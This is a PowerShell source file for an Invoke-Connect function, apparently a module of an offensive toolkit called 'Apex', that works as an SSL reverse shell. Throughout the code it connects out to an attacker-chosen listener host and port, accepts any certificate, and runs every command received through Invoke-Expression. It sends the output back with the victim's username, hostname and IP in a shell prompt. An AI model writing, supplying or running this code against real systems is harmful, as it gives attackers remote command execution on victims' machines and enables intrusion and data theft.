function Invoke-Connect {
<# 

.SYNOPSIS
Allows for transferring of all agent functionality to a remote SSL listener.

.EXAMPLE 
PS> Invoke-Connect -lhost 192.168.1.1 -lport 443 -ssl

Author: (@0rbz_)

#>

[CmdletBinding()]
param(
	[Parameter(Position=1)]
	[Switch]$Help,
	
	[Parameter(Position=0,Mandatory = $False)]
	[string]$Lhost,
	
	[Parameter(Position=1,Mandatory = $False)]
	[string]$Lport,
	[Switch]$Ssl
)

	if ($Help) {
		Write @"
		
 ### Invoke-Connect Help ###
 ---------------------------
 Available Invoke-Connect Commands:
 ----------------------------------
 /--------------------------------------------------------------------------------/
 | [-Lhost] listener_host [-Lport] listener_port [-Ssl]                           |
 | ------------------------------------------------------------------------------ |
 |                                                                                |
 |  [*] Description: Transfers all Apex functionality to a remote SSL listener.   |
 |                                                                                |
 |  [*] Usage: Invoke-Connect -Lhost 192.168.1.1 -Lport 443 -Ssl                  |
 /--------------------------------------------------------------------------------/

"@
	}
	
	elseif ($Lhost -and $Lport -and $Ssl) {
		# https://stackoverflow.com/questions/11581914/converting-ip-address-to-hex
		$Lhost = "$Lhost"
		$ar = $Lhost.Split('.')
		$Octet1 = "{0:X2}" -f [int]$ar[0]
		$Octet2 = "{0:X2}" -f [int]$ar[1]
		$Octet3 = "{0:X2}" -f [int]$ar[2]
		$Octet4 = "{0:X2}" -f [int]$ar[3]
		$Hexip = "0x"+$Octet1 + $Octet2 + $Octet3 + $Octet4

		[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
		$proxy = (New-Object System.Net.WebClient)
		$proxy.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials
		
		$socket = New-Object System.Net.Sockets.TCPClient($Hexip,$Lport)
		$stream = $socket.GetStream()
		$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))

		$sslStream.AuthenticateAsClient($Hexip)

		[byte[]]$bytes = 0..65535|%{0}
		while(($x = $sslStream.Read($bytes,0,$bytes.Length)) -ne 0) {
			$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$x)
			$flow = (Invoke-Expression $data | Out-String) + '[aPeX Shell]' + '[' + (Test-Connection -ComputerName $env:computername -count 1).IPV4Address.ipaddressTOstring +']'+'['+$env:username+'@'+$env:computername+']> '
			$flow2 = ([text.encoding]::ASCII).GetBytes($flow)
			$sslStream.Write($flow2,0,$flow2.Length)
			$sslStream.Flush()
		}
	}
}
